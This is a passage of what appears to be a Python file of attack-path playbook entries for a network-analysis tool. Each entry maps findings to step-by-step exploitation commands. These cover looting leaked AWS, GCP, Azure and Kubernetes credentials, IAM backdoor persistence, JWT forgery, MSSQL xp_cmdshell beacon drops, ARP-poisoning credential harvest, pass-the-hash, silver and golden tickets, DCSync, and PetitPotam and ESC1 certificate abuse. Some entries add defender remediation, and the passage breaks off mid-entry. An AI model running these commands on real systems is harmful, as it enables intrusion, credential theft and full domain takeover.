        "description": ("SMB/RDP/MSSQL/etc. reachable from the internet = starting position "
                        "for credential stuffing, known-CVE exploitation, or brute force."),
        "steps": [
            "Banner-grab: `nmap -sV -p <port> <host>` + `nc -zv <host> <port>`.",
            "If the banner hits a known CVE, jump straight to that exploit.",
            "Otherwise stuff credentials from the cred-spray path (CrackMapExec / patator).",
        ],
        "tools": ["nmap", "CrackMapExec", "patator"],
    },
    {
        "id": "aws-key-pillage",
        "name": "AWS access-key pillage",
        "severity": "critical",
        "phase": "cloud",
        "match_any_category": ["secret-leak"],
        "match_substring": ["AWS access key", "AWS secret", "AWS session token"],
        "description": ("Leaked AWS credentials give you whatever IAM permissions the "
                        "principal has — often far more than the app needs. Enumerate the "
                        "blast radius, loot secrets, and pivot to persistence (create "
                        "backdoor IAM user or role)."),
        "steps": [
            "Configure: `export AWS_ACCESS_KEY_ID=<id>; export AWS_SECRET_ACCESS_KEY=<secret>; "
            "export AWS_SESSION_TOKEN=<token>`.",
            "Identify: `aws sts get-caller-identity` (user/role ARN, account ID).",
            "Enumerate permissions with Pacu: `sessions import` → `iam__enum_permissions` → "
            "`iam__bruteforce_permissions`.",
            "Loot: `aws secretsmanager list-secrets && aws secretsmanager get-secret-value`; "
            "`aws ssm get-parameters-by-path --with-decryption --recursive`.",
            "Persistence (only with written authorization): create a low-profile IAM user or "
            "attach a managed policy to an existing role.",
        ],
        "tools": ["awscli", "Pacu", "enumerate-iam", "cloudsplaining"],
    },
    {
        "id": "imdsv1-ssrf",
        "name": "IMDSv1 → instance role credentials via SSRF",
        "severity": "critical",
        "phase": "cloud",
        "match_any_category": ["cloud-aws"],
        "match_substring": ["IMDSv1"],
        "description": ("IMDSv1 responses aren't gated by a session token, so any SSRF that "
                        "reaches 169.254.169.254 exfiltrates the EC2 instance role. Those "
                        "creds are usable from anywhere for ~6 hours."),
        "steps": [
            "From the SSRF, `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`.",
            "Take the role name, then `curl http://169.254.169.254/latest/meta-data/iam/"
            "security-credentials/<role>` → AccessKeyId / SecretAccessKey / Token.",
            "Load locally and run the AWS-key-pillage path.",
            "Post-compromise, force `HttpTokens=required` to stop the bleed.",
        ],
        "tools": ["curl", "awscli", "Pacu"],
    },
    {
        "id": "gcp-sa-key",
        "name": "GCP service-account JSON key pivot",
        "severity": "critical",
        "phase": "cloud",
        "match_any_category": ["secret-leak"],
        "match_substring": ["GCP service account"],
        "description": ("A leaked GCP SA key JSON authenticates as whatever principal the "
                        "key belongs to. Impersonate, then chain via IAM impersonation."),
        "steps": [
            "Save the JSON as `key.json`; `gcloud auth activate-service-account --key-file=key.json`.",
            "`gcloud projects list` / `gcloud iam service-accounts list` to map the blast radius.",
            "If the SA has `iam.serviceAccounts.getAccessToken`, pivot: "
            "`gcloud iam service-accounts get-access-token --impersonate-service-account=<higher-priv>`.",
            "Loot: Storage buckets, Secret Manager, Compute instances, Cloud Functions.",
        ],
        "tools": ["gcloud", "GCPBucketBrute", "hayat"],
    },
    {
        "id": "azure-sas-pivot",
        "name": "Azure storage / SAS token reuse",
        "severity": "high",
        "phase": "cloud",
        "match_any_category": ["secret-leak"],
        "match_substring": ["Azure Storage", "Azure SAS", "Key Vault"],
        "description": ("Captured storage connection strings or SAS URLs grant the permissions "
                        "baked into the token — read/list/write to the backing storage account "
                        "until the token expires."),
        "steps": [
            "Parse the captured SAS: the `sp=` parameter lists permissions (r/w/d/l/a).",
            "Use `azcopy list 'https://<acct>.blob.core.windows.net/<container>?<sas>'`.",
            "Enumerate: `az storage blob list --container-name <c> --sas-token <sas>`.",
            "If it's a connection string with AccountKey, you have master access — "
            "`az storage account keys list`.",
        ],
        "tools": ["az", "azcopy", "MicroBurst"],
    },
    {
        "id": "k8s-sa-token",
        "name": "Kubernetes service-account token exploitation",
        "severity": "critical",
        "phase": "cloud",
        "match_any_category": ["cloud-k8s"],
        "description": ("A leaked in-cluster SA token lets you call kube-apiserver as that "
                        "service account. Even low-priv SAs often read secrets; privileged "
                        "ones give pod exec or cluster-admin."),
        "steps": [
            "`export KUBE_TOKEN=<jwt>; kubectl --server=https://<apiserver> "
            "--token=$KUBE_TOKEN --insecure-skip-tls-verify get pods -A`.",
            "Test RBAC: `kubectl auth can-i --list`.",
            "Loot: `kubectl get secrets -A -o yaml` (most leaky: docker-registry pull creds, "
            "tls keys, service-account tokens).",
            "Pod-exec to anything you can: `kubectl exec -it <pod> -- /bin/sh`.",
        ],
        "tools": ["kubectl", "kubeletctl", "peirates", "kube-hunter"],
    },
    {
        "id": "secret-reuse-spray",
        "name": "Leaked secret reuse",
        "severity": "high",
        "phase": "credential",
        "match_any_category": ["secret-leak"],
        "match_substring": ["GitHub", "Slack", "Stripe", "npm", "PyPI", "GitLab"],
        "description": ("Developer secrets (GitHub/GitLab PATs, Slack tokens, npm/PyPI, "
                        "Stripe) often grant broad access to code, chat, or billing. "
                        "Validate the captured token, enumerate scopes, then decide whether "
                        "to use it or just report."),
        "steps": [
            "Validate: GitHub → `curl -H 'Authorization: token <pat>' https://api.github.com/"
            "user`; Slack → `curl 'https://slack.com/api/auth.test?token=<t>'`; "
            "Stripe → `curl -u <sk>: https://api.stripe.com/v1/charges?limit=1`.",
            "Enumerate scopes: GitHub returns `X-OAuth-Scopes` header; Slack response lists "
            "`user` and `team`.",
            "If authorized for offensive follow-through: clone private repos, post to Slack "
            "channels as the bot, pull customer data.",
            "Report the leak + evidence location + rotation guidance.",
        ],
        "tools": ["curl", "github-secret-scanner", "trufflehog"],
    },
    {
        "id": "s3-bucket-takeover",
        "name": "S3 bucket surface mapping",
        "severity": "high",
        "phase": "cloud",
        "match_any_category": ["cloud-aws"],
        "match_substring": ["S3"],
        "description": ("S3 bucket names disclosed in Host/SNI give you direct access "
                        "targets. Test for anonymous list/read and misconfigured ACLs."),
        "steps": [
            "Extract bucket names from findings (`<bucket>.s3.amazonaws.com`).",
            "Anonymous list: `aws s3 ls s3://<bucket> --no-sign-request`.",
            "Anonymous read: `aws s3 cp s3://<bucket>/<key> - --no-sign-request`.",
            "If it's a dangling DNS record (bucket doesn't exist), you can claim it → "
            "subdomain takeover.",
        ],
        "tools": ["awscli", "s3-buckets-finder", "bucket_finder"],
    },
    {
        "id": "beacon-investigation",
        "name": "C2 beacon — triage compromised host",
        "severity": "high",
        "phase": "incident",
        "match_any_category": ["beaconing", "suspicious-traffic"],
        "description": ("Regular low-jitter beaconing means a host is already calling out. "
                        "If it's not yours, isolate and collect."),
        "steps": [
            "From the graph, the beacon source is your primary target. The destination is "
            "the C2.",
            "Threat-intel the destination IP: VirusTotal, AlienVault OTX, urlscan.",
            "If hostile: network-isolate the host, collect memory "
            "(winpmem / AVML / LiME), rotate any creds or tokens it held.",
        ],
        "tools": ["VirusTotal", "winpmem", "Velociraptor", "AVML"],
    },
    {
        "id": "arp-poison-mitm",
        "name": "ARP cache poisoning → man-in-the-middle",
        "severity": "critical",
        "phase": "L2",
        "match_any_category": ["arp-spoof"],
        "amplifiers": ["cleartext-creds", "plaintext-protocol"],
        "description": ("Duplicate IP→MAC bindings mean someone is already poisoning the "
                        "segment, OR you can. With ARP control you become the default gateway "
                        "for that L2: harvest creds, downgrade TLS, inject responses."),
        "steps": [
            "Identify the disputed IP and the two MACs from the finding evidence. The "
            "legitimate MAC is usually the one observed first; cross-check against the "
            "switch CAM if you have access.",
            "If you're the attacker (authorized red-team): "
            "`bettercap -iface eth0 -caplet http-ui` then `set arp.spoof.targets <victim>; "
            "set arp.spoof.fullduplex true; arp.spoof on; net.sniff on`.",
            "Stack with `sslstrip2 + dns2proxy` (or bettercap's hstshijack) to break "
            "opportunistic TLS on hosts that aren't HSTS-preloaded.",
            "Collect creds with `bettercap.modules.net.sniff` or pipe to `pcredz`.",
            "If you're defending: enable Dynamic ARP Inspection (DAI) and DHCP snooping on "
            "the access switch; static ARP for crown jewels (HSM, vCenter, DCs).",
        ],
        "tools": ["bettercap", "ettercap", "arpspoof (dsniff)", "pcredz", "sslstrip2"],
    },
    {
        "id": "dns-tunnel-c2",
        "name": "DNS tunneling — C2 over DNS or data exfil",
        "severity": "high",
        "phase": "incident",
        "match_any_category": ["dns-tunnel"],
        "description": ("Long high-entropy subdomains queried against an external resolver "
                        "are the DNS-C2 / DNS-exfil shape: dnscat2, iodine, Cobalt Strike DNS "
                        "beacon, Cloak. Isolate the source, identify the beacon shape, then "
                        "pivot to the destination domain's owner."),
        "steps": [
            "From the finding evidence, capture the apex domain (e.g. `evil.com`). "
            "All children of that domain are part of the same channel.",
            "Pull every DNS query from the graph for that domain: "
            "`tshark -r capture.pcap -Y 'dns.qry.name contains \"evil.com\"' -T fields "
            "-e dns.qry.name -e ip.src > queries.txt`.",
            "Determine the tool: dnscat2 uses TXT records with 1-char prefixes; iodine "
            "uses NULL records; Cobalt Strike uses A records with hex-encoded data.",
            "Sinkhole the parent domain at the resolver (Response Policy Zone): "
            "`zone \"evil.com\" { type master; file \"sink.zone\"; };` — return localhost.",
            "Identify the C2 operator: WHOIS the apex; if it resolves to a CDN, pivot "
            "via passive DNS (Farsight, RiskIQ, SecurityTrails) to find the origin.",
            "Re-image the originating host — DNS-C2 implies persistent malware. Memory "
            "capture before reimage.",
        ],
        "tools": ["tshark", "DNSStager (detect)", "RITA", "passive DNS",
                  "winpmem / AVML"],
    },
    {
        "id": "icmp-c2-isolation",
        "name": "ICMP tunneling / C2 — isolate compromised host",
        "severity": "high",
        "phase": "incident",
        "match_any_category": ["tunneling"],
        "description": ("Oversized ICMP echo payloads are the icmpsh / ptunnel / hans / "
                        "Loki shape. Treat the source host as compromised — ICMP egress was "
                        "the channel because all the front doors were closed."),
        "steps": [
            "Confirm the shape: `tshark -r cap.pcap -Y 'icmp.type==8 && data.len>128' "
            "-T fields -e ip.src -e ip.dst -e data.len | head`. Repetitive payloads with "
            "the same first bytes = tunnel header.",
            "From the source host: live response (process listing, network connections, "
            "loaded drivers/kexts). The tunnel client is often in /tmp, %APPDATA%, or "
            "an unusual scheduled task / launchd plist.",
            "Block ICMP echo egress at the perimeter immediately; size-limit echo to 64 "
            "bytes if echo must stay enabled for monitoring.",
            "Pcap the host's outbound while you investigate — once the tunnel dies the "
            "operator may switch to DNS / HTTPS backup channel.",
            "Memory-capture before reimage. Rotate any creds the host could touch.",
        ],
        "tools": ["tshark", "Velociraptor", "winpmem / AVML", "ptunnel detect"],
    },
    {
        "id": "ntp-amplification-defense",
        "name": "NTP monlist amplification — confirm exposure",
        "severity": "medium",
        "phase": "exposure",
        "match_any_category": ["amplification"],
        "description": ("ntpd ≤ 4.2.7p25 with `monlist` enabled is a >500× UDP amplifier. "
                        "It's also actively scanned for and abused as a reflector. If you "
                        "see monlist responses leaving your network, either you're running "
                        "an exposed ntpd or you're being used as a reflector by spoofed src."),
        "steps": [
            "Confirm: `ntpdc -n -c monlist <host>` from the outside — if it answers, the "
            "service is exposed.",
            "If yours: upgrade ntpd to ≥4.2.8 or add `disable monitor` to ntp.conf. "
            "Block UDP/123 ingress for everything that isn't an upstream NTP peer.",
            "If reflection victim (spoofed src): rate-limit UDP/123 egress at the edge; "
            "file an abuse report against the originating ASN(s).",
            "Also disable: `version`, `peers`, `iostats`, `sysstats` queries from the "
            "internet — same CVE family (CVE-2013-5211 + others).",
        ],
        "tools": ["ntpdc", "nmap ntp-monlist NSE", "edge ACL"],
    },
    {
        "id": "cisco-smi-pillage",
        "name": "Cisco Smart Install (SIET) → config pull / RCE",
        "severity": "critical",
        "phase": "network",
        "match_any_category": ["network-device"],
        "match_substring": ["Smart Install", "SIET", "4786"],
        "description": ("TCP/4786 unauthenticated Smart Install (CVE-2018-0171, SIET) lets "
                        "you pull running-config (cleartext enable secrets, type-7 passwords, "
                        "SNMP communities, VTY ACLs) and push a new config — instant network "
                        "device takeover."),
        "steps": [
            "Confirm reachable: `nmap -p4786 --script smart_install <ip>` or "
            "`SIET.py -i <ip> -g` (get config).",
            "Pull config: `SIET.py -i <ip> -g -o pulled.txt`. Crack the type-7 secrets "
            "instantly (reversible) and the enable secret (hashcat -m 5700 / 9200).",
            "Pull SNMP RW community from the config → use snmp-set for full device "
            "control (set ifAdminStatus, reload, change passwords).",
            "Patch path: `no vstack` on every IOS device. Block TCP/4786 at the edge.",
        ],
        "tools": ["SIET (Smart Install Exploitation Tool)", "nmap smart_install",
                  "ciscot7 (type-7 decode)", "hashcat (5700/9200)"],
    },
    {
        "id": "weak-tls-attacks",
        "name": "Weak TLS — downgrade / BEAST / POODLE / CRIME / SWEET32",
        "severity": "high",
        "phase": "web",
        "match_any_category": ["tls-weak"],
        "description": ("Offered SSLv3 / TLS 1.0-1.1 or RC4 / 3DES / EXPORT / NULL / "
                        "anonymous-DH ciphers means downgrade attacks are on the table. "
                        "Most are network-position-dependent, but the bug class signals the "
                        "server is in maintenance debt — there are probably worse problems."),
        "steps": [
            "Fingerprint exactly: `sslscan <host>:443` or `testssl.sh <host>:443`.",
            "If you can MITM: downgrade with the TLS_FALLBACK_SCSV gap and POODLE on "
            "SSLv3, or strip with bettercap's hstshijack.",
            "If RC4 still offered: collect ~10⁹ encrypted samples of the same plaintext "
            "byte (long-lived session) → biased keystream recovers it.",
            "If 3DES (CBC, SWEET32): need ~32 GB on the same connection — practical only "
            "for very long sessions (VPN, WebSocket).",
            "Pivot finding: outdated TLS stack ↔ outdated OS ↔ unpatched RCEs. Banner-"
            "grab via `curl -k -v https://<host>` and Server header → CVE lookup.",
        ],
        "tools": ["sslscan", "testssl.sh", "bettercap hstshijack", "openssl s_client"],
    },
    {
        "id": "jwt-alg-none",
        "name": "JWT weakness — alg=none / weak HS256 / kid injection",
        "severity": "critical",
        "phase": "web",
        "match_any_category": ["jwt-weak"],
        "description": ("alg=none accepts a token with an empty signature; weak HS256 "
                        "secrets crack offline in seconds; kid SQLi / path-traversal lets "
                        "you sign with anything. Any one of these → full account takeover."),
        "steps": [
            "Decode the captured JWT: `jwt_tool <token> -T`. Note `alg`, `kid`, claims, "
            "expiry.",
            "alg=none: rebuild the token with `alg: none` header and empty signature; "
            "most jwt libs <2018 accept it.",
            "Weak HS256 secret: `hashcat -m 16500 token.txt rockyou.txt -r best64.rule` "
            "→ if cracked, sign arbitrary tokens.",
            "kid injection: try `kid: ../../../../dev/null` (signs with empty file), "
            "`kid: '; SELECT '<key>` (SQLi yields known key).",
            "Reissue token with elevated claims (admin: true, role: 'superuser', sub: "
            "a privileged user id). Replay and pwn.",
        ],
        "tools": ["jwt_tool", "hashcat (mode 16500)", "Burp Suite JWT Editor"],
    },
    {
        "id": "dns-axfr-recon",
        "name": "DNS zone transfer → full internal map",
        "severity": "high",
        "phase": "recon",
        "match_any_category": ["dns-vuln"],
        "match_substring": ["AXFR", "IXFR", "zone transfer"],
        "description": ("A nameserver that answers AXFR / IXFR for an internal zone hands "
                        "you every internal host name + IP + service in one query. Eight "
                        "hours of nmap in one zone transfer."),
        "steps": [
            "Reconfirm: `dig @<ns> <zone> AXFR` from your scanner host. If it dumps, save.",
            "Parse: extract A/AAAA → IP inventory; SRV → AD service map "
            "(_kerberos._tcp, _ldap._tcp, _autodiscover._tcp); TXT → SPF/DKIM/M365 hints; "
            "MX → mail flow.",
            "Cross-reference against the graph — anything in AXFR that you haven't seen "
            "in the pcap is a fresh target you can pivot toward.",
            "Patch path on the defender side: restrict AXFR to slave NS IPs only "
            "(`allow-transfer { <slave-ip>; };` in named.conf or equivalent).",
        ],
        "tools": ["dig", "fierce", "dnsenum", "internal recon"],
    },
    {
        "id": "upnp-wan-pivot",
        "name": "UPnP/SSDP → WAN port forward / IGD abuse",
        "severity": "high",
        "phase": "network",
        "match_any_category": ["iot"],
        "match_substring": ["SSDP", "UPnP", "M-SEARCH"],
        "description": ("Routers exposing UPnP's WANIPConnection let any LAN device punch "
                        "WAN ingress port mappings with no auth. Malware uses this to expose "
                        "internal RDP/SSH/SMB; attackers on the LAN use it for the same "
                        "thing intentionally."),
        "steps": [
            "Enumerate IGD: `upnpc -l` shows the IGD URL + service list + existing port "
            "mappings (look for surprising 3389 → INSIDE, 445 → INSIDE).",
            "Audit existing mappings: any that map internal RDP/SMB/SSH/Telnet to a "
            "WAN port is an immediate exposure — note the internal IP, that's your "
            "pivot target.",
            "Demonstrate: `upnpc -a <local-ip> 22 4444 TCP` punches SSH:4444 on the WAN "
            "side. If it succeeds, the device honors AddPortMapping with no auth.",
            "Fix on defender side: disable UPnP on the router; if needed, restrict to "
            "specific MACs / require WPS PIN.",
            "Outside attacker variant: SSDP M-SEARCH reflection (CVE-2017-7494 class) — "
            "block UDP/1900 ingress at the WAN edge.",
        ],
        "tools": ["miranda-upnp", "upnpc (miniupnpc)", "umap", "nmap upnp-info"],
    },
    {
        "id": "mssql-cleartext-pivot",
        "name": "MSSQL plaintext auth → xp_cmdshell RCE",
        "severity": "critical",
        "phase": "credential",
        "match_any_category": ["cleartext-creds", "plaintext-protocol"],
        "match_substring": ["MSSQL", "TDS", "1433"],
        "description": ("MSSQL TDS without encryption leaks the login. SQL Server logins "
                        "with sysadmin → xp_cmdshell → SYSTEM. Service-account logins are "
                        "usually reused across the SQL estate."),
        "steps": [
            "Pull the username + password from the creds tab (TDS LOGIN7 PRELOGIN).",
            "Auth: `mssqlclient.py <user>:<pass>@<host>` (impacket). Check role: "
            "`SELECT IS_SRVROLEMEMBER('sysadmin');`.",
            "If sysadmin: `enable_xp_cmdshell` then `xp_cmdshell 'whoami'`. Drop a "
            "beacon (Cobalt Strike / Sliver) via `xp_cmdshell powershell -enc <b64>`.",
            "If not sysadmin: hunt impersonable logins "
            "(`SELECT a.name FROM sys.server_permissions p JOIN sys.server_principals a "
            "ON p.grantor_principal_id = a.principal_id WHERE permission_name = "
            "'IMPERSONATE';`), then `EXECUTE AS LOGIN = '<target>'`.",
            "Spray the cleartext password across other MSSQL hosts in the pcap (likely "
            "reuse).",
        ],
        "tools": ["impacket mssqlclient", "Powerupsql (Get-SQLInstanceDomain / "
                  "Invoke-SQLAudit)", "sqlmap (--os-shell)"],
    },
    {
        "id": "snmp-community-pillage",
        "name": "SNMP community string → device pillage + network map",
        "severity": "critical",
        "phase": "network",
        "match_any_category": ["weak-auth"],
        "match_substring": ["SNMP"],
        "description": ("A captured SNMP v1/v2c community grants either read (RO) or write "
                        "(RW) access depending on which it is. RO walks the device's ARP "
                        "table, interface list, routing table, and often the running "
                        "config; RW lets you reconfigure the device — re-route traffic "
                        "through you, change passwords, or reboot."),
        "steps": [
            "Walk: `snmpwalk -c <community> -v 2c <host>`. If it returns the system "
            "tree, you have at least RO.",
            "Map the network: pull `ipNetToMediaTable` (ARP), `ifTable` (interfaces), "
            "`ipRouteTable`. Cross-reference against the graph — you now have every "
            "ARP-reachable host on every VLAN.",
            "If Cisco: `snmpwalk -c <community> -v 2c <host> 1.3.6.1.4.1.9.9.96` and "
            "TFTP-download the running config via SNMP-set on the legacy "
            "`ccCopyEntry` OIDs — yields enable secrets, type-7 passwords, ACLs.",
            "Test RW non-destructively: `snmpset -c <community> -v 2c <host> "
            "<sysContact.0> s 'test'`. If it succeeds, you can also `sysShutdown`, "
            "change ifAdminStatus, etc.",
            "Spray the same community across the rest of the network — it's almost "
            "always reused on every switch / router / WAP from the same vendor.",
        ],
        "tools": ["snmpwalk / snmpset (net-snmp)", "onesixtyone (community spray)",
                  "snmpcheck", "Metasploit auxiliary/scanner/snmp/*"],
    },
    {
        "id": "scanner-traffic-investigate",
        "name": "Scanner traffic — confirm origin + reuse the recon",
        "severity": "medium",
        "phase": "recon",
        "match_any_category": ["scanner"],
        "description": ("A User-Agent matching sqlmap/Nikto/Burp/zgrab/feroxbuster/etc. "
                        "either means you have an authorized scan running, an unauthorized "
                        "scan from inside the network (compromised host or rogue user), or "
                        "an external attacker not even bothering to mask. The scan results "
                        "tell you what they're pivoting toward."),
        "steps": [
            "Cross-check with the scanning-engagement schedule. If unsanctioned, treat "
            "the source IP as compromised / unauthorized — isolate.",
            "Pull every URL the scanner hit from the HTTP feed: those are the next "
            "moves the operator will try.",
            "For each 200-OK response in the scan, that's a path on a target the scanner "
            "considers interesting — assume the attacker will exploit it next.",
            "If external: block at perimeter; share the source IP with your CERT/ISAC.",
            "If internal: live response on the source host (PID-of-curl, network conns, "
            "history files).",
        ],
        "tools": ["graylog / SIEM correlation", "live response", "Velociraptor"],
    },
    # ----- classic Active Directory chain -----
    {
        "id": "pass-the-hash",
        "name": "Pass-the-Hash — NT hash → SMB/WinRM/WMI as that user",
        "severity": "critical",
        "phase": "AD lateral",
        "match_any_category": ["ntlm-capture", "smb"],
        "description": ("Any NT-hash you hold authenticates the user wherever the protocol "
                        "accepts NTLM. No password crack required. The cracked half of "
                        "NetNTLMv2 (or a dumped SAM/NTDS hash) is the input."),
        "steps": [
            "Source the hash: NetNTLMv2 cracked offline (mode 5600), SAM dump from a "
            "compromised endpoint, or `secretsdump` from a target where you already have "
            "SYSTEM.",
            "Confirm reachability: `crackmapexec smb <subnet> -u <user> -H <nthash>` "
            "lists every host where the hash works + admin context.",
            "Land code: `crackmapexec smb <host> -u <user> -H <nthash> -x 'whoami /all'` "
            "or `impacket-psexec <user>@<host> -hashes :<nthash>` for an interactive "
            "SYSTEM shell. WinRM variant: `evil-winrm -i <host> -u <user> -H <nthash>`.",
            "Pivot off the new host: dump LSASS → harvest more hashes/tickets; check "
            "`klist` for delegated tickets.",
            "Defender side: enable LSA Protection + Credential Guard; restrict NTLM "
            "with auditing first (`Network security: Restrict NTLM`); deploy LAPS so "
            "local-admin hashes differ per machine.",
        ],
        "tools": ["impacket psexec / wmiexec / smbexec",
                  "CrackMapExec / nxc", "evil-winrm", "mimikatz `sekurlsa::pth`"],
    },
    {
        "id": "overpass-the-hash",
        "name": "Overpass-the-Hash — NT hash → Kerberos TGT",
        "severity": "critical",
        "phase": "AD lateral",
        "match_any_category": ["ntlm-capture", "kerberos-weak"],
        "description": ("Trade an NT hash for a TGT so Kerberos-only services and "
                        "logged 'NTLM was used' alerts both go quiet. Same hash, different "
                        "auth surface — what most pentesters call 'Pass-the-Key' on the "
                        "wire."),
        "steps": [
            "`impacket-getTGT <domain>/<user> -hashes :<nthash>` produces a usable "
            ".ccache.",
            "Export and use: `export KRB5CCNAME=$PWD/<user>.ccache`. Verify: "
            "`impacket-psexec -k -no-pass <user>@<host>.<domain>`.",
            "Or mimikatz: `sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> "
            "/run:powershell` — spawns a process with Kerberos auth.",
            "Pivot via Kerberos-only services (LDAP-with-channel-binding, MSSQL-with-"
            "Kerberos, SMB on hosts that disabled NTLM).",
            "Defender side: same as PtH — enable Credential Guard, audit/restrict NTLM. "
            "Also alert on TGTs issued for accounts that don't normally need Kerberos.",
        ],
        "tools": ["impacket getTGT", "Rubeus asktgt", "mimikatz sekurlsa::pth"],
    },
    {
        "id": "silver-ticket",
        "name": "Silver Ticket — service NT hash → forged TGS for that SPN",
        "severity": "critical",
        "phase": "AD lateral",
        "match_any_category": ["kerberos-weak", "ntlm-capture"],
        "description": ("A service-account NT hash (or computer account $hash) lets you "
                        "forge a TGS for any SPN that account owns. No KDC contact required "
                        "— defenders won't see a 4769 because no TGS was actually requested."),
        "steps": [
            "Acquire the service account's NT hash (Kerberoast crack, lsadump from a "
            "host where it logs in, or DCSync if you have replication rights).",
            "Identify the SPN(s): `setspn -L <svc-account>` or LDAP query "
            "`(servicePrincipalName=*)`.",
            "Forge: `impacket-ticketer -nthash <hash> -domain-sid <sid> -domain "
            "<domain> -spn cifs/<host>.<domain> Administrator` (impersonate any user).",
            "Load: `export KRB5CCNAME=Administrator.ccache`, then `impacket-psexec -k "
            "-no-pass <host>.<domain>` (cifs SPN gives SMB; mssqlsvc gives MSSQL; "
            "http gives WinRM; etc.).",
            "Persistence variant: forge with a long lifetime ('use after rotate' "
            "scenarios).",
            "Defender side: rotate service-account passwords regularly (gMSA preferred); "
            "monitor 4624 logon-types and Kerberos PAC validation; enable PAC signing.",
        ],
        "tools": ["impacket ticketer", "Rubeus silver", "mimikatz kerberos::golden"],
    },
    {
        "id": "golden-ticket",
        "name": "Golden Ticket — KRBTGT hash → forge TGT for anyone",
        "severity": "critical",
        "phase": "AD persistence",
        "match_any_category": ["smb", "ntlm-capture", "ad-weakness"],
        "match_substring": ["DCSync", "KRBTGT", "secretsdump", "lsadump"],
        "description": ("The KRBTGT account's NT hash signs every TGT in the domain. With "
                        "it you forge TGTs for anyone, with any group membership, for any "
                        "lifetime — even after the user's password rotates. Domain "
                        "persistence; needs DA to obtain initially."),
        "steps": [
            "Pre-req: domain-admin already, OR DCSync rights "
            "(`impacket-secretsdump -just-dc-user krbtgt <domain>/<user>@<dc>`).",
            "Extract domain SID: `Get-ADDomain | select DomainSID` or "
            "`impacket-lookupsid <user>@<dc>`.",
            "Forge: `impacket-ticketer -nthash <krbtgt-nthash> -domain-sid <sid> "
            "-domain <domain> Administrator` → Administrator.ccache.",
            "Use: `export KRB5CCNAME=Administrator.ccache`; any Kerberos action now runs "
            "as Administrator with Enterprise-Admins membership.",
            "Defender side: rotate KRBTGT TWICE (10+ hours apart) — this is the only "
            "remediation. Monitor TGTs with anomalous PAC sizes or non-default lifetimes.",
        ],
        "tools": ["impacket secretsdump", "impacket ticketer",
                  "Rubeus golden", "mimikatz kerberos::golden"],
    },
    {
        "id": "dcsync-pillage",
        "name": "DCSync — replicate every NTLM hash from the DC",
        "severity": "critical",
        "phase": "AD persistence",
        "match_any_category": ["ntlm-capture", "smb", "ad-weakness"],
        "description": ("If your principal has `DS-Replication-Get-Changes` + `DS-Replication-"
                        "Get-Changes-All` (Domain Admins / Enterprise Admins / built-in "
                        "Account Operators on some setups), DCSync pulls every account's "
                        "NTLM history without ever touching the DC's disk — looks like normal "
                        "replication."),
        "steps": [
            "Confirm rights with `BloodHound` `MATCH (n) WHERE n.GetChanges=true RETURN n` "
            "or `impacket-dacledit -action read -principal <user> -target-dn DC=...`.",
            "Pull: `impacket-secretsdump -just-dc <domain>/<user>:'<pass>'@<dc>` (or "
            "`-hashes :<nthash>` if you only have the hash).",
            "Parse: `<domain>/Administrator:500:aad3b...:31d6cfe...:::` — Administrator NTLM "
            "is the prize. KRBTGT hash enables the golden-ticket path.",
            "Crack the LM/NT hashes locally with hashcat (mode 1000) — cracked plaintext "
            "tells you password policy and reveals reuse.",
            "Defender side: audit non-tier-0 accounts that have replication rights — "
            "common misconfiguration. Use `Get-ADObject` + DCSync-specific log "
            "(event 4662 with the GUID for replication).",
        ],
        "tools": ["impacket secretsdump", "mimikatz lsadump::dcsync",
                  "PowerView Get-DomainObjectACL", "BloodHound"],
    },
    {
        "id": "petitpotam-adcs-esc8",
        "name": "PetitPotam → NTLM relay to AD CS HTTP enrollment (ESC8)",
        "severity": "critical",
        "phase": "AD lateral",
        "match_any_category": ["spoofable-resolution", "ntlm-capture", "smb"],
        "description": ("AD CS web enrollment (certsrv) accepts NTLM and has no channel "
                        "binding. PetitPotam coerces a DC to authenticate to you over MS-EFSRPC. "
                        "Relay that auth into AD CS, get a cert in the DC's name, then use "
                        "the cert via PKINIT for TGT-of-DC$ → full domain compromise."),
        "steps": [
            "Find the AD CS web enrollment URL: "
            "`certutil -config - -ping` or browse `http://<ca>/certsrv/`. "
            "ESC8 requires NTLM accepted there (channel-binding off / NTLM allowed).",
            "Start the relay: `impacket-ntlmrelayx -t http://<ca>/certsrv/certfnsh.asp "
            "-smb2support --adcs --template DomainController`.",
            "Coerce: `python3 PetitPotam.py -u '' -p '' <attacker-ip> <dc-ip>` (anon if "
            "the host accepts unauthenticated EFSRPC) or with creds.",
            "Relay extracts a base64 cert. Use it: `python3 gettgtpkinit.py "
            "<domain>/<dc>$ -cert-pfx dc.pfx dc.ccache` → DC machine TGT.",
            "From there: `secretsdump -k -no-pass <domain>/<dc>$@<dc>` → KRBTGT → "
            "golden ticket → domain.",
            "Defender side: enable EPA + RequireSSL on certsrv (channel binding); "
            "block MS-EFSRPC at DC firewall (KB5005413); patch the AD CS templates "
            "(remove Enrollee-Supplies-Subject + Client-Authentication on overly "
            "permissive templates).",
        ],
        "tools": ["impacket ntlmrelayx --adcs", "PetitPotam", "Certipy",
                  "gettgtpkinit + getnthash (pkinit chain)"],
    },
    {
        "id": "adcs-esc1-template",
        "name": "AD CS ESC1 — enrollee-supplies-subject template = DA",
        "severity": "critical",
        "phase": "AD lateral",
        "match_any_category": ["ad-weakness", "ntlm-capture"],
        "description": ("A certificate template with Enrollee-Supplies-Subject + Client-"
                        "Authentication EKU + Authenticated-Users enroll permission lets "
                        "any domain user request a cert in another user's name. PKINIT with "
                        "that cert gives a TGT for the impersonated user — pick Administrator."),
        "steps": [
            "Enumerate: `certipy find -u <user> -p <pass> -dc-ip <dc>` — flags ESC1-ESC11 "
            "templates automatically.",
            "Look for `Enrollee Supplies Subject: True`, `Client Authentication: True`, "
            "and `Enrollment Rights: <Authenticated Users / Domain Users / your group>`.",
            "Request the cert: `certipy req -u <user> -p <pass> -ca <ca-name> "
            "-template <template> -upn Administrator@<domain>`.",
            "Authenticate as Administrator: `certipy auth -pfx administrator.pfx` → "
            "returns NT hash + TGT.",
            "Land: `impacket-psexec -hashes :<nthash> Administrator@<dc>` or "
            "`secretsdump -just-dc` for the full hash set.",
            "Defender side: remove Enrollee-Supplies-Subject from any template with "
            "Client-Auth EKU; or remove the EKU; or restrict enrollment to a tier-0 "
            "group only.",
        ],
        "tools": ["Certipy", "PSPKIAudit", "PKINITtools",
                  "impacket-psexec / secretsdump"],
    },
    {
        "id": "zerologon-cve-2020-1472",
        "name": "Zerologon (CVE-2020-1472) — instant DA on unpatched DC",
        "severity": "critical",
        "phase": "AD lateral",
